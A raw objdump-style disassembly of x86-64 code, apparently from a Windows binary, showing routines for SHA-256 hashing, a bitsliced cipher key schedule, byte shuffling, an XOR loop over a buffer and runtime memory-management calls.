    6d8cbcae:	e9 43 78 ff ff       	jmp    0x6d8c34f6
    6d8cbcb3:	48 8b 0d 76 34 10 00 	mov    0x103476(%rip),%rcx        # 0x6d9cf130
    6d8cbcba:	31 d2                	xor    %edx,%edx
    6d8cbcbc:	e9 35 78 ff ff       	jmp    0x6d8c34f6
    6d8cbcc1:	48 8b 0d 00 35 10 00 	mov    0x103500(%rip),%rcx        # 0x6d9cf1c8
    6d8cbcc8:	31 d2                	xor    %edx,%edx
    6d8cbcca:	e9 27 78 ff ff       	jmp    0x6d8c34f6
    6d8cbccf:	48 8b 0d 7a 34 10 00 	mov    0x10347a(%rip),%rcx        # 0x6d9cf150
    6d8cbcd6:	31 d2                	xor    %edx,%edx
    6d8cbcd8:	e9 19 78 ff ff       	jmp    0x6d8c34f6
    6d8cbcdd:	48 8b 0d 64 34 10 00 	mov    0x103464(%rip),%rcx        # 0x6d9cf148
    6d8cbce4:	31 d2                	xor    %edx,%edx
    6d8cbce6:	e9 0b 78 ff ff       	jmp    0x6d8c34f6
    6d8cbceb:	48 8b 0d 16 35 10 00 	mov    0x103516(%rip),%rcx        # 0x6d9cf208
    6d8cbcf2:	31 d2                	xor    %edx,%edx
    6d8cbcf4:	e9 fd 77 ff ff       	jmp    0x6d8c34f6
    6d8cbcf9:	48 8b 0d 90 39 10 00 	mov    0x103990(%rip),%rcx        # 0x6d9cf690
    6d8cbd00:	31 d2                	xor    %edx,%edx
    6d8cbd02:	e9 ef 77 ff ff       	jmp    0x6d8c34f6
    6d8cbd07:	48 8b 0d 22 35 10 00 	mov    0x103522(%rip),%rcx        # 0x6d9cf230
    6d8cbd0e:	31 d2                	xor    %edx,%edx
    6d8cbd10:	e9 e1 77 ff ff       	jmp    0x6d8c34f6
    6d8cbd15:	56                   	push   %rsi
    6d8cbd16:	53                   	push   %rbx
    6d8cbd17:	48 bb 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%rbx
    6d8cbd1e:	ff 00 ff 
    6d8cbd21:	45 8b 10             	mov    (%r8),%r10d
    6d8cbd24:	45 8b 58 04          	mov    0x4(%r8),%r11d
    6d8cbd28:	45 8b 48 08          	mov    0x8(%r8),%r9d
    6d8cbd2c:	41 8b 40 0c          	mov    0xc(%r8),%eax
    6d8cbd30:	4d 89 d0             	mov    %r10,%r8
    6d8cbd33:	49 c1 e0 10          	shl    $0x10,%r8
    6d8cbd37:	4d 09 c2             	or     %r8,%r10
    6d8cbd3a:	4d 89 d8             	mov    %r11,%r8
    6d8cbd3d:	49 c1 e0 10          	shl    $0x10,%r8
    6d8cbd41:	4d 09 c3             	or     %r8,%r11
    6d8cbd44:	4d 89 c8             	mov    %r9,%r8
    6d8cbd47:	49 c1 e0 10          	shl    $0x10,%r8
    6d8cbd4b:	4d 09 c1             	or     %r8,%r9
    6d8cbd4e:	49 89 c0             	mov    %rax,%r8
    6d8cbd51:	49 c1 e0 10          	shl    $0x10,%r8
    6d8cbd55:	4c 09 c0             	or     %r8,%rax
    6d8cbd58:	49 b8 ff ff 00 00 ff 	movabs $0xffff0000ffff,%r8
    6d8cbd5f:	ff 00 00 
    6d8cbd62:	4d 21 c2             	and    %r8,%r10
    6d8cbd65:	4d 21 c3             	and    %r8,%r11
    6d8cbd68:	4d 21 c1             	and    %r8,%r9
    6d8cbd6b:	4c 21 c0             	and    %r8,%rax
    6d8cbd6e:	4d 89 d0             	mov    %r10,%r8
    6d8cbd71:	49 c1 e0 08          	shl    $0x8,%r8
    6d8cbd75:	48 89 c6             	mov    %rax,%rsi
    6d8cbd78:	4d 09 c2             	or     %r8,%r10
    6d8cbd7b:	4d 89 d8             	mov    %r11,%r8
    6d8cbd7e:	48 c1 e6 08          	shl    $0x8,%rsi
    6d8cbd82:	49 c1 e0 08          	shl    $0x8,%r8
    6d8cbd86:	48 09 f0             	or     %rsi,%rax
    6d8cbd89:	4d 09 c3             	or     %r8,%r11
    6d8cbd8c:	4d 89 c8             	mov    %r9,%r8
    6d8cbd8f:	48 c1 e0 08          	shl    $0x8,%rax
    6d8cbd93:	49 c1 e0 08          	shl    $0x8,%r8
    6d8cbd97:	48 21 d8             	and    %rbx,%rax
    6d8cbd9a:	4d 09 c1             	or     %r8,%r9
    6d8cbd9d:	49 b8 ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%r8
    6d8cbda4:	00 ff 00 
    6d8cbda7:	49 c1 e1 08          	shl    $0x8,%r9
    6d8cbdab:	4d 21 c2             	and    %r8,%r10
    6d8cbdae:	4d 21 c3             	and    %r8,%r11
    6d8cbdb1:	49 21 d9             	and    %rbx,%r9
    6d8cbdb4:	4c 09 d8             	or     %r11,%rax
    6d8cbdb7:	4d 09 d1             	or     %r10,%r9
    6d8cbdba:	4c 89 09             	mov    %r9,(%rcx)
    6d8cbdbd:	48 89 02             	mov    %rax,(%rdx)
    6d8cbdc0:	5b                   	pop    %rbx
    6d8cbdc1:	5e                   	pop    %rsi
    6d8cbdc2:	c3                   	ret
    6d8cbdc3:	56                   	push   %rsi
    6d8cbdc4:	53                   	push   %rbx
    6d8cbdc5:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cbdc9:	48 89 d3             	mov    %rdx,%rbx
    6d8cbdcc:	e8 6b 8e ff ff       	call   0x6d8c4c3c
    6d8cbdd1:	48 85 c0             	test   %rax,%rax
    6d8cbdd4:	74 34                	je     0x6d8cbe0a
    6d8cbdd6:	4c 8b 10             	mov    (%rax),%r10
    6d8cbdd9:	49 89 d9             	mov    %rbx,%r9
    6d8cbddc:	48 89 da             	mov    %rbx,%rdx
    6d8cbddf:	0f b6 f7             	movzbl %bh,%esi
    6d8cbde2:	49 c1 f9 10          	sar    $0x10,%r9
    6d8cbde6:	48 c1 fa 18          	sar    $0x18,%rdx
    6d8cbdea:	45 31 c0             	xor    %r8d,%r8d
    6d8cbded:	4d 39 d0             	cmp    %r10,%r8
    6d8cbdf0:	7d 18                	jge    0x6d8cbe0a
    6d8cbdf2:	42 8a 4c 00 10       	mov    0x10(%rax,%r8,1),%cl
    6d8cbdf7:	31 d9                	xor    %ebx,%ecx
    6d8cbdf9:	31 f1                	xor    %esi,%ecx
    6d8cbdfb:	44 31 c9             	xor    %r9d,%ecx
    6d8cbdfe:	31 d1                	xor    %edx,%ecx
    6d8cbe00:	42 88 4c 00 10       	mov    %cl,0x10(%rax,%r8,1)
    6d8cbe05:	49 ff c0             	inc    %r8
    6d8cbe08:	eb e3                	jmp    0x6d8cbded
    6d8cbe0a:	48 83 c4 28          	add    $0x28,%rsp
    6d8cbe0e:	5b                   	pop    %rbx
    6d8cbe0f:	5e                   	pop    %rsi
    6d8cbe10:	c3                   	ret
    6d8cbe11:	56                   	push   %rsi
    6d8cbe12:	53                   	push   %rbx
    6d8cbe13:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cbe17:	48 89 ce             	mov    %rcx,%rsi
    6d8cbe1a:	48 89 d3             	mov    %rdx,%rbx
    6d8cbe1d:	48 8d 0d bc 32 10 00 	lea    0x1032bc(%rip),%rcx        # 0x6d9cf0e0
    6d8cbe24:	e8 e6 89 ff ff       	call   0x6d8c480f
    6d8cbe29:	31 d2                	xor    %edx,%edx
    6d8cbe2b:	48 39 da             	cmp    %rbx,%rdx
    6d8cbe2e:	7d 0c                	jge    0x6d8cbe3c
    6d8cbe30:	8a 0c 16             	mov    (%rsi,%rdx,1),%cl
    6d8cbe33:	88 4c 10 10          	mov    %cl,0x10(%rax,%rdx,1)
    6d8cbe37:	48 ff c2             	inc    %rdx
    6d8cbe3a:	eb ef                	jmp    0x6d8cbe2b
    6d8cbe3c:	48 83 c4 28          	add    $0x28,%rsp
    6d8cbe40:	5b                   	pop    %rbx
    6d8cbe41:	5e                   	pop    %rsi
    6d8cbe42:	c3                   	ret
    6d8cbe43:	55                   	push   %rbp
    6d8cbe44:	57                   	push   %rdi
    6d8cbe45:	56                   	push   %rsi
    6d8cbe46:	53                   	push   %rbx
    6d8cbe47:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cbe4b:	48 89 d6             	mov    %rdx,%rsi
    6d8cbe4e:	48 89 cb             	mov    %rcx,%rbx
    6d8cbe51:	ba 20 00 00 00       	mov    $0x20,%edx
    6d8cbe56:	48 8d 7b 28          	lea    0x28(%rbx),%rdi
    6d8cbe5a:	48 89 f1             	mov    %rsi,%rcx
    6d8cbe5d:	e8 09 fd ff ff       	call   0x6d8cbb6b
    6d8cbe62:	8b 03                	mov    (%rbx),%eax
    6d8cbe64:	48 8d 6b 08          	lea    0x8(%rbx),%rbp
    6d8cbe68:	83 e0 3f             	and    $0x3f,%eax
    6d8cbe6b:	c6 44 03 28 80       	movb   $0x80,0x28(%rbx,%rax,1)
    6d8cbe70:	48 ff c0             	inc    %rax
    6d8cbe73:	48 83 f8 38          	cmp    $0x38,%rax
    6d8cbe77:	75 78                	jne    0x6d8cbef1
    6d8cbe79:	8b 03                	mov    (%rbx),%eax
    6d8cbe7b:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    6d8cbe81:	8b 4b 04             	mov    0x4(%rbx),%ecx
    6d8cbe84:	89 c2                	mov    %eax,%edx
    6d8cbe86:	c1 e0 03             	shl    $0x3,%eax
    6d8cbe89:	c1 ea 1d             	shr    $0x1d,%edx
    6d8cbe8c:	89 03                	mov    %eax,(%rbx)
    6d8cbe8e:	0f c8                	bswap  %eax
    6d8cbe90:	8d 14 ca             	lea    (%rdx,%rcx,8),%edx
    6d8cbe93:	89 43 64             	mov    %eax,0x64(%rbx)
    6d8cbe96:	48 89 e9             	mov    %rbp,%rcx
    6d8cbe99:	89 53 04             	mov    %edx,0x4(%rbx)
    6d8cbe9c:	0f ca                	bswap  %edx
    6d8cbe9e:	89 53 60             	mov    %edx,0x60(%rbx)
    6d8cbea1:	48 89 fa             	mov    %rdi,%rdx
    6d8cbea4:	e8 17 9f ff ff       	call   0x6d8c5dc0
    6d8cbea9:	8b 43 08             	mov    0x8(%rbx),%eax
    6d8cbeac:	0f c8                	bswap  %eax
    6d8cbeae:	89 06                	mov    %eax,(%rsi)
    6d8cbeb0:	8b 43 0c             	mov    0xc(%rbx),%eax
    6d8cbeb3:	0f c8                	bswap  %eax
    6d8cbeb5:	89 46 04             	mov    %eax,0x4(%rsi)
    6d8cbeb8:	8b 43 10             	mov    0x10(%rbx),%eax
    6d8cbebb:	0f c8                	bswap  %eax
    6d8cbebd:	89 46 08             	mov    %eax,0x8(%rsi)
    6d8cbec0:	8b 43 14             	mov    0x14(%rbx),%eax
    6d8cbec3:	0f c8                	bswap  %eax
    6d8cbec5:	89 46 0c             	mov    %eax,0xc(%rsi)
    6d8cbec8:	8b 43 18             	mov    0x18(%rbx),%eax
    6d8cbecb:	0f c8                	bswap  %eax
    6d8cbecd:	89 46 10             	mov    %eax,0x10(%rsi)
    6d8cbed0:	8b 43 1c             	mov    0x1c(%rbx),%eax
    6d8cbed3:	0f c8                	bswap  %eax
    6d8cbed5:	89 46 14             	mov    %eax,0x14(%rsi)
    6d8cbed8:	8b 43 20             	mov    0x20(%rbx),%eax
    6d8cbedb:	0f c8                	bswap  %eax
    6d8cbedd:	89 46 18             	mov    %eax,0x18(%rsi)
    6d8cbee0:	8b 43 24             	mov    0x24(%rbx),%eax
    6d8cbee3:	0f c8                	bswap  %eax
    6d8cbee5:	89 46 1c             	mov    %eax,0x1c(%rsi)
    6d8cbee8:	48 83 c4 28          	add    $0x28,%rsp
    6d8cbeec:	5b                   	pop    %rbx
    6d8cbeed:	5e                   	pop    %rsi
    6d8cbeee:	5f                   	pop    %rdi
    6d8cbeef:	5d                   	pop    %rbp
    6d8cbef0:	c3                   	ret
    6d8cbef1:	48 83 f8 40          	cmp    $0x40,%rax
    6d8cbef5:	75 13                	jne    0x6d8cbf0a
    6d8cbef7:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    6d8cbefd:	48 89 fa             	mov    %rdi,%rdx
    6d8cbf00:	48 89 e9             	mov    %rbp,%rcx
    6d8cbf03:	e8 b8 9e ff ff       	call   0x6d8c5dc0
    6d8cbf08:	31 c0                	xor    %eax,%eax
    6d8cbf0a:	c6 44 03 28 00       	movb   $0x0,0x28(%rbx,%rax,1)
    6d8cbf0f:	48 ff c0             	inc    %rax
    6d8cbf12:	e9 5c ff ff ff       	jmp    0x6d8cbe73
    6d8cbf17:	41 57                	push   %r15
    6d8cbf19:	41 56                	push   %r14
    6d8cbf1b:	41 55                	push   %r13
    6d8cbf1d:	41 54                	push   %r12
    6d8cbf1f:	55                   	push   %rbp
    6d8cbf20:	57                   	push   %rdi
    6d8cbf21:	56                   	push   %rsi
    6d8cbf22:	53                   	push   %rbx
    6d8cbf23:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
    6d8cbf2a:	31 ed                	xor    %ebp,%ebp
    6d8cbf2c:	41 be 40 00 00 00    	mov    $0x40,%r14d
    6d8cbf32:	48 8d 5c 24 28       	lea    0x28(%rsp),%rbx
    6d8cbf37:	49 89 cd             	mov    %rcx,%r13
    6d8cbf3a:	49 89 d7             	mov    %rdx,%r15
    6d8cbf3d:	4c 89 84 24 f0 00 00 	mov    %r8,0xf0(%rsp)
    6d8cbf44:	00 
    6d8cbf45:	4c 8d 63 28          	lea    0x28(%rbx),%r12
    6d8cbf49:	ba 68 00 00 00       	mov    $0x68,%edx
    6d8cbf4e:	48 89 d9             	mov    %rbx,%rcx
    6d8cbf51:	e8 15 fc ff ff       	call   0x6d8cbb6b
    6d8cbf56:	48 b8 67 e6 09 6a 85 	movabs $0xbb67ae856a09e667,%rax
    6d8cbf5d:	ae 67 bb 
    6d8cbf60:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    6d8cbf67:	00 00 
    6d8cbf69:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
    6d8cbf6e:	48 b8 72 f3 6e 3c 3a 	movabs $0xa54ff53a3c6ef372,%rax
    6d8cbf75:	f5 4f a5 
    6d8cbf78:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
    6d8cbf7d:	48 b8 7f 52 0e 51 8c 	movabs $0x9b05688c510e527f,%rax
    6d8cbf84:	68 05 9b 
    6d8cbf87:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
    6d8cbf8c:	48 b8 ab d9 83 1f 19 	movabs $0x5be0cd191f83d9ab,%rax
    6d8cbf93:	cd e0 5b 
    6d8cbf96:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
    6d8cbf9b:	4d 85 ff             	test   %r15,%r15
    6d8cbf9e:	7e 51                	jle    0x6d8cbff1
    6d8cbfa0:	8b 54 24 28          	mov    0x28(%rsp),%edx
    6d8cbfa4:	49 8d 74 2d 00       	lea    0x0(%r13,%rbp,1),%rsi
    6d8cbfa9:	4c 89 f0             	mov    %r14,%rax
    6d8cbfac:	83 e2 3f             	and    $0x3f,%edx
    6d8cbfaf:	48 29 d0             	sub    %rdx,%rax
    6d8cbfb2:	48 8d 54 13 28       	lea    0x28(%rbx,%rdx,1),%rdx
    6d8cbfb7:	4c 39 f8             	cmp    %r15,%rax
    6d8cbfba:	49 0f 4f c7          	cmovg  %r15,%rax
    6d8cbfbe:	48 89 d7             	mov    %rdx,%rdi
    6d8cbfc1:	89 c1                	mov    %eax,%ecx
    6d8cbfc3:	48 01 c5             	add    %rax,%rbp
    6d8cbfc6:	49 29 c7             	sub    %rax,%r15
    6d8cbfc9:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8cbfcb:	03 44 24 28          	add    0x28(%rsp),%eax
    6d8cbfcf:	89 44 24 28          	mov    %eax,0x28(%rsp)
    6d8cbfd3:	73 04                	jae    0x6d8cbfd9
    6d8cbfd5:	ff 44 24 2c          	incl   0x2c(%rsp)
    6d8cbfd9:	a8 3f                	test   $0x3f,%al
    6d8cbfdb:	75 be                	jne    0x6d8cbf9b
    6d8cbfdd:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
    6d8cbfe1:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    6d8cbfe7:	4c 89 e2             	mov    %r12,%rdx
    6d8cbfea:	e8 d1 9d ff ff       	call   0x6d8c5dc0
    6d8cbfef:	eb aa                	jmp    0x6d8cbf9b
    6d8cbff1:	48 8b 94 24 f0 00 00 	mov    0xf0(%rsp),%rdx
    6d8cbff8:	00 
    6d8cbff9:	48 89 d9             	mov    %rbx,%rcx
    6d8cbffc:	e8 42 fe ff ff       	call   0x6d8cbe43
    6d8cc001:	ba 68 00 00 00       	mov    $0x68,%edx
    6d8cc006:	48 89 d9             	mov    %rbx,%rcx
    6d8cc009:	e8 52 9d ff ff       	call   0x6d8c5d60
    6d8cc00e:	90                   	nop
    6d8cc00f:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
    6d8cc016:	5b                   	pop    %rbx
    6d8cc017:	5e                   	pop    %rsi
    6d8cc018:	5f                   	pop    %rdi
    6d8cc019:	5d                   	pop    %rbp
    6d8cc01a:	41 5c                	pop    %r12
    6d8cc01c:	41 5d                	pop    %r13
    6d8cc01e:	41 5e                	pop    %r14
    6d8cc020:	41 5f                	pop    %r15
    6d8cc022:	c3                   	ret
    6d8cc023:	41 56                	push   %r14
    6d8cc025:	41 55                	push   %r13
    6d8cc027:	41 54                	push   %r12
    6d8cc029:	55                   	push   %rbp
    6d8cc02a:	57                   	push   %rdi
    6d8cc02b:	56                   	push   %rsi
    6d8cc02c:	53                   	push   %rbx
    6d8cc02d:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
    6d8cc034:	31 ed                	xor    %ebp,%ebp
    6d8cc036:	45 31 ed             	xor    %r13d,%r13d
    6d8cc039:	48 8d bc 24 50 01 00 	lea    0x150(%rsp),%rdi
    6d8cc040:	00 
    6d8cc041:	49 89 d1             	mov    %rdx,%r9
    6d8cc044:	48 89 cb             	mov    %rcx,%rbx
    6d8cc047:	ba f0 00 00 00       	mov    $0xf0,%edx
    6d8cc04c:	48 89 f9             	mov    %rdi,%rcx
    6d8cc04f:	49 89 fe             	mov    %rdi,%r14
    6d8cc052:	e8 14 fb ff ff       	call   0x6d8cbb6b
    6d8cc057:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
    6d8cc05c:	ba f0 00 00 00       	mov    $0xf0,%edx
    6d8cc061:	4c 8d a7 d0 00 00 00 	lea    0xd0(%rdi),%r12
    6d8cc068:	48 89 f1             	mov    %rsi,%rcx
    6d8cc06b:	e8 fb fa ff ff       	call   0x6d8cbb6b
    6d8cc070:	48 c7 83 c0 03 00 00 	movq   $0xe,0x3c0(%rbx)
    6d8cc077:	0e 00 00 00 
    6d8cc07b:	49 8b 11             	mov    (%r9),%rdx
    6d8cc07e:	41 8b 49 1c          	mov    0x1c(%r9),%ecx
    6d8cc082:	48 89 94 24 50 01 00 	mov    %rdx,0x150(%rsp)
    6d8cc089:	00 
    6d8cc08a:	49 8b 51 08          	mov    0x8(%r9),%rdx
    6d8cc08e:	48 89 94 24 58 01 00 	mov    %rdx,0x158(%rsp)
    6d8cc095:	00 
    6d8cc096:	49 8b 51 10          	mov    0x10(%r9),%rdx
    6d8cc09a:	48 89 94 24 60 01 00 	mov    %rdx,0x160(%rsp)
    6d8cc0a1:	00 
    6d8cc0a2:	49 8b 51 18          	mov    0x18(%r9),%rdx
    6d8cc0a6:	48 89 94 24 68 01 00 	mov    %rdx,0x168(%rsp)
    6d8cc0ad:	00 
    6d8cc0ae:	4d 85 ed             	test   %r13,%r13
    6d8cc0b1:	74 0f                	je     0x6d8cc0c2
    6d8cc0b3:	49 83 fd 04          	cmp    $0x4,%r13
    6d8cc0b7:	75 1e                	jne    0x6d8cc0d7
    6d8cc0b9:	e8 5e bd ff ff       	call   0x6d8c7e1c
    6d8cc0be:	89 c1                	mov    %eax,%ecx
    6d8cc0c0:	eb 15                	jmp    0x6d8cc0d7
    6d8cc0c2:	c1 c9 08             	ror    $0x8,%ecx
    6d8cc0c5:	e8 52 bd ff ff       	call   0x6d8c7e1c
    6d8cc0ca:	48 8b 15 df c6 0e 00 	mov    0xec6df(%rip),%rdx        # 0x6d9b87b0
    6d8cc0d1:	0f b6 0c 2a          	movzbl (%rdx,%rbp,1),%ecx
    6d8cc0d5:	31 c1                	xor    %eax,%ecx
    6d8cc0d7:	41 33 0e             	xor    (%r14),%ecx
    6d8cc0da:	49 ff c5             	inc    %r13
    6d8cc0dd:	49 83 fd 08          	cmp    $0x8,%r13
    6d8cc0e1:	41 89 4e 20          	mov    %ecx,0x20(%r14)
    6d8cc0e5:	75 06                	jne    0x6d8cc0ed
    6d8cc0e7:	48 ff c5             	inc    %rbp
    6d8cc0ea:	45 31 ed             	xor    %r13d,%r13d
    6d8cc0ed:	49 83 c6 04          	add    $0x4,%r14
    6d8cc0f1:	4d 39 f4             	cmp    %r14,%r12
    6d8cc0f4:	75 b8                	jne    0x6d8cc0ae
    6d8cc0f6:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
    6d8cc0fb:	45 31 ed             	xor    %r13d,%r13d
    6d8cc0fe:	49 be 11 11 11 11 11 	movabs $0x1111111111111111,%r14
    6d8cc105:	11 11 11 
    6d8cc108:	4c 8d 65 20          	lea    0x20(%rbp),%r12
    6d8cc10c:	ba 40 00 00 00       	mov    $0x40,%edx
    6d8cc111:	48 89 e9             	mov    %rbp,%rcx
    6d8cc114:	e8 52 fa ff ff       	call   0x6d8cbb6b
    6d8cc119:	4e 8d 04 2f          	lea    (%rdi,%r13,1),%r8
    6d8cc11d:	4c 89 e2             	mov    %r12,%rdx
    6d8cc120:	48 89 e9             	mov    %rbp,%rcx
    6d8cc123:	e8 ed fb ff ff       	call   0x6d8cbd15
    6d8cc128:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
    6d8cc12d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8cc132:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
    6d8cc137:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
    6d8cc13c:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
    6d8cc141:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
    6d8cc146:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
    6d8cc14b:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
    6d8cc150:	e8 ab ba ff ff       	call   0x6d8c7c00
    6d8cc155:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
    6d8cc15a:	49 b9 22 22 22 22 22 	movabs $0x2222222222222222,%r9
    6d8cc161:	22 22 22 
    6d8cc164:	49 b8 44 44 44 44 44 	movabs $0x4444444444444444,%r8
    6d8cc16b:	44 44 44 
    6d8cc16e:	48 b9 88 88 88 88 88 	movabs $0x8888888888888888,%rcx
    6d8cc175:	88 88 88 
    6d8cc178:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8cc17d:	4c 21 f2             	and    %r14,%rdx
    6d8cc180:	4c 21 c8             	and    %r9,%rax
    6d8cc183:	4c 23 4c 24 48       	and    0x48(%rsp),%r9
    6d8cc188:	48 09 c2             	or     %rax,%rdx
    6d8cc18b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
    6d8cc190:	4c 21 c0             	and    %r8,%rax
    6d8cc193:	4c 23 44 24 50       	and    0x50(%rsp),%r8
    6d8cc198:	48 09 c2             	or     %rax,%rdx
    6d8cc19b:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
    6d8cc1a0:	48 21 c8             	and    %rcx,%rax
    6d8cc1a3:	48 23 4c 24 58       	and    0x58(%rsp),%rcx
    6d8cc1a8:	48 09 c2             	or     %rax,%rdx
    6d8cc1ab:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
    6d8cc1b0:	4a 89 14 2e          	mov    %rdx,(%rsi,%r13,1)
    6d8cc1b4:	4c 21 f0             	and    %r14,%rax
    6d8cc1b7:	4c 09 c8             	or     %r9,%rax
    6d8cc1ba:	4c 09 c0             	or     %r8,%rax
    6d8cc1bd:	48 09 c8             	or     %rcx,%rax
    6d8cc1c0:	4a 89 44 2e 08       	mov    %rax,0x8(%rsi,%r13,1)
    6d8cc1c5:	49 83 c5 10          	add    $0x10,%r13
    6d8cc1c9:	49 81 fd f0 00 00 00 	cmp    $0xf0,%r13
    6d8cc1d0:	0f 85 36 ff ff ff    	jne    0x6d8cc10c
    6d8cc1d6:	48 8b 83 c0 03 00 00 	mov    0x3c0(%rbx),%rax
    6d8cc1dd:	45 31 c9             	xor    %r9d,%r9d
    6d8cc1e0:	49 ba 11 11 11 11 11 	movabs $0x1111111111111111,%r10
    6d8cc1e7:	11 11 11 
    6d8cc1ea:	48 8d 50 01          	lea    0x1(%rax),%rdx
    6d8cc1ee:	48 01 d2             	add    %rdx,%rdx
    6d8cc1f1:	49 39 d1             	cmp    %rdx,%r9
    6d8cc1f4:	7d 4d                	jge    0x6d8cc243
    6d8cc1f6:	4a 8b 04 ce          	mov    (%rsi,%r9,8),%rax
    6d8cc1fa:	48 83 c3 20          	add    $0x20,%rbx
    6d8cc1fe:	49 ff c1             	inc    %r9
    6d8cc201:	49 89 c0             	mov    %rax,%r8
    6d8cc204:	48 89 c1             	mov    %rax,%rcx
    6d8cc207:	49 89 c3             	mov    %rax,%r11
    6d8cc20a:	49 d1 e8             	shr    $1,%r8
    6d8cc20d:	48 c1 e9 02          	shr    $0x2,%rcx
    6d8cc211:	4d 21 d3             	and    %r10,%r11
    6d8cc214:	48 c1 e8 03          	shr    $0x3,%rax
    6d8cc218:	4d 21 d0             	and    %r10,%r8
    6d8cc21b:	4c 21 d1             	and    %r10,%rcx
    6d8cc21e:	4d 6b db 0f          	imul   $0xf,%r11,%r11
    6d8cc222:	4c 21 d0             	and    %r10,%rax
    6d8cc225:	4d 6b c0 0f          	imul   $0xf,%r8,%r8
    6d8cc229:	48 6b c9 0f          	imul   $0xf,%rcx,%rcx
    6d8cc22d:	48 6b c0 0f          	imul   $0xf,%rax,%rax
    6d8cc231:	4c 89 5b e0          	mov    %r11,-0x20(%rbx)
    6d8cc235:	4c 89 43 e8          	mov    %r8,-0x18(%rbx)
    6d8cc239:	48 89 4b f0          	mov    %rcx,-0x10(%rbx)
    6d8cc23d:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
    6d8cc241:	eb ae                	jmp    0x6d8cc1f1
    6d8cc243:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
    6d8cc24a:	5b                   	pop    %rbx
    6d8cc24b:	5e                   	pop    %rsi
    6d8cc24c:	5f                   	pop    %rdi
    6d8cc24d:	5d                   	pop    %rbp
    6d8cc24e:	41 5c                	pop    %r12
    6d8cc250:	41 5d                	pop    %r13
    6d8cc252:	41 5e                	pop    %r14
    6d8cc254:	c3                   	ret
    6d8cc255:	56                   	push   %rsi
    6d8cc256:	53                   	push   %rbx
    6d8cc257:	48 83 ec 38          	sub    $0x38,%rsp
    6d8cc25b:	4c 8b 12             	mov    (%rdx),%r10
    6d8cc25e:	48 8b 42 08          	mov    0x8(%rdx),%rax
    6d8cc262:	31 d2                	xor    %edx,%edx
    6d8cc264:	4c 01 d1             	add    %r10,%rcx
    6d8cc267:	4c 29 d0             	sub    %r10,%rax
    6d8cc26a:	48 ff c0             	inc    %rax
    6d8cc26d:	4c 39 c8             	cmp    %r9,%rax
    6d8cc270:	0f 84 8e 00 00 00    	je     0x6d8cc304
    6d8cc276:	48 8b 0d b3 c4 0e 00 	mov    0xec4b3(%rip),%rcx        # 0x6d9b8730
    6d8cc27d:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8cc282:	e8 ce 7b ff ff       	call   0x6d8c3e55
    6d8cc287:	48 8d 0d f2 79 00 00 	lea    0x79f2(%rip),%rcx        # 0x6d8d3c80
    6d8cc28e:	48 89 c3             	mov    %rax,%rbx
    6d8cc291:	48 8b 05 68 c4 0e 00 	mov    0xec468(%rip),%rax        # 0x6d9b8700
    6d8cc298:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    6d8cc29c:	48 89 03             	mov    %rax,(%rbx)
    6d8cc29f:	48 8d 05 5a 6f 00 00 	lea    0x6f5a(%rip),%rax        # 0x6d8d3200
    6d8cc2a6:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8cc2aa:	e8 21 7c ff ff       	call   0x6d8c3ed0
    6d8cc2af:	48 85 f6             	test   %rsi,%rsi
    6d8cc2b2:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6d8cc2b6:	74 26                	je     0x6d8cc2de
    6d8cc2b8:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
    6d8cc2bc:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
    6d8cc2c0:	48 83 e8 08          	sub    $0x8,%rax
    6d8cc2c4:	48 83 f8 07          	cmp    $0x7,%rax
    6d8cc2c8:	48 89 46 f0          	mov    %rax,-0x10(%rsi)
    6d8cc2cc:	77 10                	ja     0x6d8cc2de
    6d8cc2ce:	48 8b 0d bb c5 0e 00 	mov    0xec5bb(%rip),%rcx        # 0x6d9b8890
    6d8cc2d5:	48 83 c1 18          	add    $0x18,%rcx
    6d8cc2d9:	e8 8d 6a ff ff       	call   0x6d8c2d6b
    6d8cc2de:	48 c7 44 24 20 35 00 	movq   $0x35,0x20(%rsp)
    6d8cc2e5:	00 00 
    6d8cc2e7:	4c 8d 0d 1e 6f 00 00 	lea    0x6f1e(%rip),%r9        # 0x6d8d320c
    6d8cc2ee:	48 89 d9             	mov    %rbx,%rcx
    6d8cc2f1:	4c 8d 05 1e 6f 00 00 	lea    0x6f1e(%rip),%r8        # 0x6d8d3216
    6d8cc2f8:	48 8d 15 01 6f 00 00 	lea    0x6f01(%rip),%rdx        # 0x6d8d3200
    6d8cc2ff:	e8 f3 83 ff ff       	call   0x6d8c46f7
